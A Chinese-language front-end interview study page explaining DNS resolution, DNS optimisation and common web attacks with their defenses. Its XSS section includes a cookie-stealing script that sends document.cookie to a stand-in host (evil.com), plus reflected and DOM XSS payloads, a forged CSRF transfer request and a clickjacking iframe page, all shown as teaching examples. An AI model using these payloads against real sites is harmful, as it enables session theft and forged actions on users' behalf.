---
sidebar_position: 5
title: "DNS 解析与网络安全"
difficulty: "medium"
tags: ["network", "dns", "security"]
---

# DNS 解析与网络安全

DNS 解析是网络请求的第一步，Web 安全则是前端开发必须掌握的防御知识。两者都是面试中的高频考点。

## DNS 解析过程

DNS（Domain Name System）将域名解析为 IP 地址，是浏览器发起网络请求的第一步。

```
 用户输入 url.com
        │
        ▼
 ┌──────────────┐
 │ 浏览器 DNS 缓存 │  chrome://net-internals/#dns
 └──────┬───────┘
        │ 未命中
        ▼
 ┌──────────────┐
 │ 操作系统 DNS 缓存│  本地 hosts 文件
 └──────┬───────┘
        │ 未命中
        ▼
 ┌──────────────┐
 │   路由器缓存   │
 └──────┬───────┘
        │ 未命中
        ▼
 ┌──────────────┐
 │  ISP DNS 服务器 │  运营商提供的递归 DNS
 └──────┬───────┘
        │ 未命中（递归查询开始）
        ▼
 ┌──────────────┐
 │  根域名服务器   │  全球 13 组根服务器 (.)
 └──────┬───────┘
        │ 返回 TLD 服务器地址
        ▼
 ┌──────────────┐
 │ TLD 域名服务器 │  .com / .cn / .org 等
 └──────┬───────┘
        │ 返回权威 DNS 服务器地址
        ▼
 ┌──────────────────┐
 │ 权威域名服务器      │  例如阿里云 DNS、Cloudflare
 │ (Authoritative NS)│
 └──────┬───────────┘
        │ 返回最终 IP 地址
        ▼
   浏览器缓存结果，发起 TCP 连接
```

### 递归查询 vs 迭代查询

| 类型 | 说明 | 示例 |
|------|------|------|
| 递归查询 | 客户端只问一次，DNS 服务器负责完成全部解析 | 浏览器 → 本地 DNS 服务器 |
| 迭代查询 | 客户端依次询问各级 DNS 服务器 | 本地 DNS → 根/TLD/权威 DNS |

## DNS 记录类型

| 记录类型 | 含义 | 示例 |
|---------|------|------|
| A | 域名 → IPv4 地址 | `example.com → 93.184.216.34` |
| AAAA | 域名 → IPv6 地址 | `example.com → 2606:2800:220:1:...` |
| CNAME | 域名 → 另一个域名（别名） | `www.example.com → example.com` |
| MX | 邮件交换记录 | `example.com → mail.example.com` |
| NS | 域名服务器记录 | `example.com → ns1.dnspod.net` |
| TXT | 文本记录（验证、SPF 等） | `example.com → "v=spf1 include:..."` |
| SRV | 服务记录 | 指定服务的主机和端口 |

## DNS 优化

### dns-prefetch

```html
<!-- 预解析即将访问的域名 DNS -->
<link rel="dns-prefetch" href="//api.example.com" />
<link rel="dns-prefetch" href="//cdn.example.com" />

<!-- 同时使用 preconnect 建立完整连接 -->
<link rel="preconnect" href="https://api.example.com" crossorigin />

<!-- 在 HTML head 中尽早声明 -->
<head>
  <link rel="dns-prefetch" href="//fonts.googleapis.com" />
  <link rel="dns-prefetch" href="//www.google-analytics.com" />
</head>
```

### DNS-over-HTTPS（DoH）

传统 DNS 查询使用明文 UDP 协议，容易被监听和篡改。DoH 使用 HTTPS 加密 DNS 查询。

```javascript
// 浏览器默认 DoH 设置（Chrome）
// chrome://settings/security → 使用安全 DNS

// 使用 Cloudflare DoH
// https://cloudflare-dns.com/dns-query

// 使用 fetch 手动调用 DoH API
async function dohQuery(domain) {
  const url = `https://cloudflare-dns.com/dns-query?name=${domain}&type=A`;
  const res = await fetch(url, {
    headers: { 'Accept': 'application/dns-json' },
  });
  return res.json();
}
```

## 常见 Web 攻击与防御

### XSS（跨站脚本攻击）

XSS 攻击者在页面中注入恶意脚本，窃取用户数据或执行恶意操作。

**三种类型：**

| 类型 | 存储方式 | 触发方式 | 危害程度 |
|------|---------|---------|---------|
| 存储型 XSS | 服务器数据库 | 用户访问页面时执行 | 最高 |
| 反射型 XSS | URL 参数 | 点击恶意链接时执行 | 中等 |
| DOM 型 XSS | 前端 DOM 操作 | 前端脚本处理 URL/DOM | 中等 |

```javascript
// 存储型 XSS 示例
// 攻击者在评论中注入脚本
// <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
// 该脚本存储在数据库中，其他用户浏览时执行

// 反射型 XSS 示例
// https://example.com/search?q=<script>alert('XSS')</script>
// 服务器将 q 参数直接拼接到 HTML 中返回

// DOM 型 XSS 示例
// https://example.com#<img src=x onerror=alert('XSS')>
document.getElementById('output').innerHTML = location.hash.slice(1);
```

**防御措施：**

```javascript
// 1. 输出转义
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
  };
  return str.replace(/[&<>"']/g, (c) => map[c]);
}

// 2. 使用 textContent 而非 innerHTML
element.textContent = userInput; // 安全
element.innerHTML = userInput;   // 危险！

// 3. CSP（Content Security Policy）
// 在 HTTP 头或 meta 标签中设置
// Content-Security-Policy: script-src 'self' 'nonce-abc123';
```

```html
<!-- CSP 配置 -->
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self';
           script-src 'self' 'nonce-abc123' https://cdn.example.com;
           style-src 'self' 'unsafe-inline';
           img-src 'self' data: https:;
           connect-src 'self' https://api.example.com;">
```

### CSRF（跨站请求伪造）

CSRF 攻击利用用户已登录的身份，诱导用户访问恶意页面，向目标网站发送伪造请求。

```
 用户已登录 bank.com（Cookie 中有 session）
        │
        ▼
 访问恶意网站 evil.com
        │
        ▼
 evil.com 页面中包含：
 <img src="https://bank.com/transfer?to=hacker&amount=10000">
        │
        ▼
 浏览器自动携带 bank.com 的 Cookie 发送请求
        │
        ▼
 bank.com 收到请求，Cookie 验证通过，执行转账
```

**防御措施：**

```javascript
// 1. SameSite Cookie（推荐）
// Strict: 完全禁止第三方 Cookie
// Lax:  GET 请求允许，POST 禁止（默认值）
// None: 允许跨站（必须配合 Secure）
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly

// 2. CSRF Token
// 服务端生成 Token，嵌入表单或请求头
// 方式一：表单隐藏字段
// <input type="hidden" name="_csrf" value="token-value">

// 方式二：请求头携带 Token
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCsrfToken(),  // 从 meta 标签或 cookie 中获取
  },
  body: JSON.stringify({ to: 'user', amount: 100 }),
});

// 3. 验证 Origin / Referer 头
// 服务端检查请求来源是否合法
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer;
  if (!origin || !origin.startsWith('https://myapp.com')) {
    return res.status(403).json({ error: '非法来源' });
  }
  next();
});
```

### 点击劫持（Clickjacking）

攻击者将目标网站嵌入透明 iframe 中，诱导用户点击。

```html
<!-- 攻击者的恶意页面 -->
<style>
  iframe {
    position: absolute;
    opacity: 0;              /* 透明，用户看不到 */
    width: 100%;
    height: 100%;
  }
</style>
<button>点击领取奖品</button>
<iframe src="https://bank.com/confirm-delete"></iframe>
```

**防御措施：**

```http
# 1. X-Frame-Options 头
X-Frame-Options: DENY                # 禁止嵌入任何 iframe
X-Frame-Options: SAMEORIGIN          # 只允许同源嵌入

# 2. CSP frame-ancestors（推荐，替代 X-Frame-Options）
Content-Security-Policy: frame-ancestors 'self';           # 只允许同源
Content-Security-Policy: frame-ancestors 'none';           # 完全禁止
Content-Security-Policy: frame-ancestors 'self' trusted.com; # 允许指定域名
```

### DDoS 攻击概述

DDoS（分布式拒绝服务攻击）通过大量请求使目标服务器无法正常服务。

| 类型 | 攻击层面 | 说明 |
|------|---------|------|
| 流量型 | 网络层 | 大量 UDP/ICMP 包耗尽带宽 |
| 协议型 | 传输层 | SYN Flood 耗尽连接资源 |
| 应用型 | 应用层 | HTTP Flood 模拟正常请求 |

**防御（非前端职责，但需要了解）：**

- CDN 分发流量
- WAF（Web Application Firewall）
- 限流与速率限制
- IP 黑名单
- 云服务商的 DDoS 防护（如 Cloudflare、AWS Shield）

## 安全响应头

```http
# 完整的安全头配置示例
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
X-Frame-Options: SAMEORIGIN
```

| 安全头 | 作用 | 推荐值 |
|--------|------|--------|
| `Content-Security-Policy` | 防 XSS，限制资源加载来源 | 根据项目配置 |
| `Strict-Transport-Security` | 强制使用 HTTPS | `max-age=31536000; includeSubDomains` |
| `X-Content-Type-Options` | 防止 MIME 类型嗅探 | `nosniff` |
| `X-XSS-Protection` | 启用浏览器 XSS 过滤器 | `1; mode=block` |
| `Referrer-Policy` | 控制 Referer 头信息泄露 | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | 限制浏览器 API 访问权限 | 按需设置 |
| `X-Frame-Options` | 防点击劫持 | `SAMEORIGIN` |

## 面试要点

1. **DNS 解析流程**：掌握从浏览器缓存到权威 DNS 的完整过程
2. **XSS 防御**：三种 XSS 类型及各自的防御措施
3. **CSRF 防御**：SameSite Cookie、CSRF Token、Origin 验证
4. **安全头配置**：CSP、HSTS、X-Content-Type-Options 的作用
5. **HTTPS 与 DoH**：了解加密 DNS 查询的意义

## 常见面试题

**Q: DNS 解析的过程是怎样的？**

A: 浏览器缓存 → 操作系统缓存 → 路由器缓存 → ISP DNS 服务器 → 根域名服务器 → TLD 域名服务器 → 权威域名服务器。浏览器和操作系统缓存命中则直接返回，ISP DNS 作为递归解析器完成后续查询。

**Q: 什么是 XSS？如何防御？**

A: XSS（跨站脚本攻击）是攻击者在页面注入恶意脚本。分存储型（数据库）、反射型（URL 参数）、DOM 型（前端 DOM 操作）三种。防御：(1) 输出转义；(2) 使用 CSP 限制脚本来源；(3) 避免使用 innerHTML，用 textContent 代替；(4) Cookie 设置 HttpOnly。

**Q: 什么是 CSRF？如何防御？**

A: CSRF（跨站请求伪造）利用用户已登录的身份，诱导用户访问恶意页面发送伪造请求。防御：(1) SameSite Cookie 属性（推荐 Lax）；(2) CSRF Token 验证；(3) 检查 Origin/Referer 头；(4) 关键操作要求二次验证（如密码确认）。

**Q: `dns-prefetch` 和 `preconnect` 的区别？**

A: `dns-prefetch` 只预解析 DNS，开销很小，适合第三方域名。`preconnect` 会完成 DNS 解析 + TCP 连接 + TLS 握手，开销更大但收益更高，适合确定会访问的关键域名。两者都应尽早声明在 `<head>` 中。

**Q: CSP（Content Security Policy）是什么？如何配置？**

A: CSP 是一种安全策略，通过 HTTP 头或 meta 标签声明页面可以加载哪些资源。常用指令：`default-src`（默认策略）、`script-src`（脚本来源）、`style-src`（样式来源）、`img-src`（图片来源）。可以有效防止 XSS、数据注入等攻击。例如 `script-src 'self' 'nonce-abc123'` 表示只允许加载同源脚本和带指定 nonce 的脚本。
